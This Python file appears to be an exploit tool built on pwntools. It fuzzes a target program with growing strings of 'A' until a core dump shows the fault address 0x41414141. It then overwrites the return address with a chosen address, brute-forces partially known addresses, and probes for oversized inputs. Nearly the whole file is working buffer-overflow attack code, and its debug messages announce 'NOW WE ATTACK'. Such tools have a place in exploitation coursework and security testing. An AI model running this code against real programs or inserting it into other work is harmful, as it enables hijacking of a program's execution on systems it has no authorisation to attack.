
import subprocess
import pexpect
import sys
import subprocess
from pwn import *
from pwnlib import *


#Helper function that calls a program as if it were called from the command line
def cmd_line_call(name, args):
    child = pexpect.spawn(name, [args])
    # Wait for the end of the output
    child.expect(pexpect.EOF)
    out = child.before  # we get all the data before the EOF (stderr and stdout)
    child.close()  # that will set the return code for us
    # signalstatus and existstatus read as the same (for my purpose only)
    if child.exitstatus is None:
        returncode = child.signalstatus
    else:
        returncode = child.exitstatus
    return (out, returncode)


#Find the minimum length of the input string that can corrupt the memory
def findMinBadLen(fuzzFile, fuzzedProgram, mutations, inputFromFile,detailedLog):
    minBadLen = sys.maxsize
    lenToReachReturnAddr = sys.maxsize
    inp = ""
    broken=0
    if inputFromFile:
        for i in range(1,mutations):
            inp = inp + 'A'
            currLen = len(inp)
            # create files and keep feeding them into the system
            inputFromFile = open(fuzzFile, 'wb')
            inputFromFile.write(currLen.to_bytes(4, 'big'))
            inputFromFile.write(bytes(inp, 'utf-8'))
            inputFromFile.close()
            try:
                output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailedLog:
                    print(output.stdout)
                    print(output.stderr)
            except subprocess.CalledProcessError:
                if broken==0:
                    minBadLen = currLen
                    broken=1
                    if detailedLog:
                        print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
                faultAddr=sigFaultAddr()    
                if faultAddr== '0x41414141':
                    lenToReachReturnAddr=currLen-4
                    break
    else:
        for i in range(mutations):
            inp = inp + 'A'
            currLen = len(inp)
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailedLog:
                    print(output.stdout)
                    print(output.stderr)
            except subprocess.CalledProcessError:
                if broken==0:
                    minBadLen = currLen
                    broken=1
                    if detailedLog:
                        print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
                faultAddr=sigFaultAddr()    
                if faultAddr== '0x41414141':
                    lenToReachReturnAddr=currLen-4
                    break
    print(f"The minimum bad len input that was found is {minBadLen}")
    return lenToReachReturnAddr


#Attempt to deturn the execution of the program by inserting in the input string an address to go to 
def attackSystem(lenToReachReturnAddr, fuzzedProgram, fuzzFile, attackAddress,inputFromFile, detailedLog):
    if lenToReachReturnAddr==sys.maxsize:
        print("System was not broken due to lack of mutations or segmentation fault not occuring")
        return 0
    if inputFromFile:
        inputFromFile = open(fuzzFile, 'wb')
        attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
        attackString = b'A' * lenToReachReturnAddr + attackAddress
        inputFromFile.write(attackLen)
        inputFromFile.write(attackString)
        inputFromFile.close()
        if detailedLog:
            print("NOW WE ATTACK")
            print("This is our weapon ", fuzzFile)
            print(attackLen)
            print(attackString)
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        if detailedLog:
            print(output)
            print("Return code=", returncode)
    else:
        inp=lenToReachReturnAddr*b"A"
        inp=inp+attackAddress
        attackLen=(lenToReachReturnAddr + 4)
        if detailedLog:
            print("NOW WE ATTACK")
            print("This is our weapon ", inp)
        subprocess.call([fuzzedProgram,inp])
        
    return attackLen


#Attempt to break the system while the system reads the input feeding it extremely large strings
def breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile,detailedLog):
    # +4 to overwrite the return address
    inp = b'A' * (lenToReachReturnAddr + 4)
    i=1
    gb=10_000_000_000
    faultAddr='0x41414141'
    if inputFromFile:
        while i<gb and faultAddr== '0x41414141':
            inp = inp + i*b'A'
            currLen = lenToReachReturnAddr+4+i
            # create files and keep feeding them into the system
            file = open(fuzzFile, 'wb')
            file.write(currLen.to_bytes(4, 'big'))
            file.write(inp)
            file.close()
            output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
            if detailedLog:
                print(output)
                print(returncode)
                print("Len=", currLen)
                print("Si_addr=", sigFaultAddr())
            i=i*10
            faultAddr=sigFaultAddr()
    else:
        while i<gb and faultAddr== '0x41414141':
            inp = inp + i*b'A'
            currLen = lenToReachReturnAddr+4+i
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                if detailedLog:
                    print(output)
            except subprocess.CalledProcessError:
                if detailedLog:
                    print("Len=", currLen)
                    print("Si_addr=", sigFaultAddr())
            except OSError:
                break
            i=i*10
            faultAddr=sigFaultAddr()
    if i>=gb:
        print("The attack file can be at least 1 GB in size")
    else:
        print(f"The attack file size can be at least {int(i/10)} bytes in size")

#Make the address big endian
#returns a normal view of the address into a string form
def convertAddressToString(addr):
    addr=str(addr)
    aux=addr.replace("\\x",'')
    aux=aux.replace("b'",'')
    aux=aux.replace('\'','')
    flipBytes=""
    i=1
    auxc=''
    for c in reversed(aux):
        if i%2==1:
            auxc=c
        else:
            flipBytes=flipBytes+c+auxc
        i=i+1
    return flipBytes


# partial address must contain full bytes
def attackWithPartialAddress(lenToReachReturnAddr, partialAddress, fuzzedProgram, fuzzFile, inputFromFile,detailedLog):

    # build the address
    partialAddressLen = len(partialAddress)
    unknownBytesNr = 4 - partialAddressLen
    possibleAddresses= pow(256,unknownBytesNr)
    validAddresses=[b'0']
    if inputFromFile :
        for i in range(possibleAddresses.__round__()):
            file = open(fuzzFile, 'wb')
            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress
            # build the attack
            attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
            inp = b'A' * lenToReachReturnAddr
            file.write(attackLen)
            file.write(inp)
            file.write(attackAddress)
            file.close()
            if detailedLog:
                print("NOW WE ATTACK")
                print("This is our weapon ", fuzzFile)
                print(inp)
                print(attackAddress)
            try:
                output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            except subprocess.CalledProcessError:
                faultAddr=sigFaultAddr().replace("0x",'')
                myaddr=convertAddressToString(attackAddress)
                if faultAddr!='0' and faultAddr!=myaddr:
                    #execution got deflected to a valid address
                    validAddresses.append(attackAddress)
                else:
                    if detailedLog:
                        print("Not a valid address", attackAddress)
    else:
        for i in range(1,possibleAddresses):
            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress
            inp = b'A' * lenToReachReturnAddr
            inp=inp+ attackAddress
            if detailedLog:
                print("NOW WE ATTACK")
                print(inp)
                print(attackAddress)
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                print(output)
            except subprocess.CalledProcessError:
                faultAddr=sigFaultAddr().replace("0x",'')
                myaddr=convertAddressToString(attackAddress)
                if faultAddr!='0' and faultAddr!=myaddr:
                    #execution got deflected to a valid address
                    validAddresses.append(attackAddress)
                else:
                    if detailedLog:
                        print("Not a valid address", attackAddress)
            except ValueError:
                if detailedLog:
                    print("Address contains null bytes",attackAddress)
    validAddresses.remove(b'0')
    return validAddresses
    
 #Extract the fault_addr value with the help of the core file 
def sigFaultAddr():

    c = Corefile('./core')
    return hex(c.fault_addr)